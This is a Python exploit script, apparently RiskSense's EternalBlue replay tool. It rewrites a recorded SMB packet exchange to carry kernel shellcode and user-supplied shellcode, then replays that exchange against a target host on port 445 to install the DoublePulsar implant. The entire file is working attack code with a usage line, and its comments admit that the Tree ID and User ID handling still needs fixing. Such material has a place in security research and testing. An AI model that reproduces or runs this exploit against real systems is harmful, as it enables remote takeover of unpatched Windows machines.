#!/env/bin/python3
#
# EternalBlue replay attack by @jennamagius
#
# Copyright (C) 2017 RiskSense, Inc.
#
# License: Apache 2.0
#
# Infects a machine with DoublePulsar.
# Tested against Windows Server 2008 R2 SP1 x64
#
# Tree ID and User ID need fixing and it should be 100 emojii
#

import sys
import socket
import time
import ast
import binascii

def rebake_replay():
    backlog = open("eternalblue.dat").read().split("\n\n")
    backlog = [ast.literal_eval(i) for i in backlog]
    orig_shellcode = open("orig_shellcode",'rb').read()
    kernel = open("../../payloads/x64/bin/kernel.bin","rb").read()[:-3]
    user_shellcode = open(sys.argv[2],'rb').read()
    new_shellcode = kernel + int(len(user_shellcode)).to_bytes(2,'little') + user_shellcode
    to_replace = orig_shellcode[:len(new_shellcode)]
    new_backlog = []
    for i in backlog:
        if i[0] != 'send':
            new_backlog.append(i)
            continue
        j = list(i)
        j[2] = j[2].replace(to_replace,new_shellcode)
        new_backlog.append(tuple(j))
    open("rebaked.dat","w").write("\n\n".join([repr(i) for i in new_backlog]))

def main(hostip):
    rebake_replay()
    backlog = open("rebaked.dat").read().split("\n\n")
    backlog = [ast.literal_eval(i) for i in backlog]
    connections = []
    userid = b'\x00\x08'
    treeid = b'\x00\x08'
    start = time.monotonic()
    for i in backlog:
        delta = i[-1] - (start - time.monotonic())
        print(i[0], delta)
        if delta > 0:
            time.sleep(delta)
        start = time.monotonic()
        if i[0] == "connect":
            sock = socket.socket()
            sock.connect((hostip,445))
            connections.append({"socket":sock,"stream" : i[1]})
        if i[0] == "close":
            [j['socket'].close() for j in connections if j["stream"] == i[1]]
        if i[0] == "send":
            data = i[2].replace(b"__USERID__PLACEHOLDER__", userid)
            data = data.replace(b"__TREEID__PLACEHOLDER__", treeid)
            [j['socket'].send(data) for j in connections if j["stream"] == i[1]]
        if i[0] == "recv":
            data = [j['socket'].recv(2048) for j in connections if j['stream'] == i[1]]
            if len(i) > 3:
                if i[2] == "treeid":
                    print("Getting TreeID from Tree Connect Response")
                    treeid = data[0][28:30]
                    print("TreeId:", int.from_bytes(treeid,'little'))
                if i[2] == "userid":
                    print("Getting UserID from Session Setup AndX Response")
                    userid = data[0][32:34]
                    print("UserID:", int.from_bytes(userid,'little'))


if __name__ == "__main__":
    if len(sys.argv) > 2:
        main(sys.argv[1])
    else:
        print("Usage: ./eternalblue.py HOST USER_SHELLCODE_FILE")
